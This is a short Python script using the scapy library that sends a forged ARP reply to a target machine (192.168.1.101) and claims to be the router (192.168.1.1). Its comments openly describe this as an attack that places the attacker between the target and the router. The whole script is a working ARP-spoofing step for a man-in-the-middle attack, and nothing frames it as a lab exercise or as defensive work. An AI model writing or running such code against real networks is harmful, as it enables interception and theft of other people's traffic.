import scapy.all as scapy
# We will be getting data from user as we are router
# Simple behaviour: target -> router
# Our attack: target -> hacker -> router
# psrc - our router ip
# pdst - target ip
# hwdst - target mac address
packet = scapy.ARP(op=2, pdst="192.168.1.101", hwdst="f4:37:b7:d0:36:cd", psrc="192.168.1.1")
scapy.send(packet)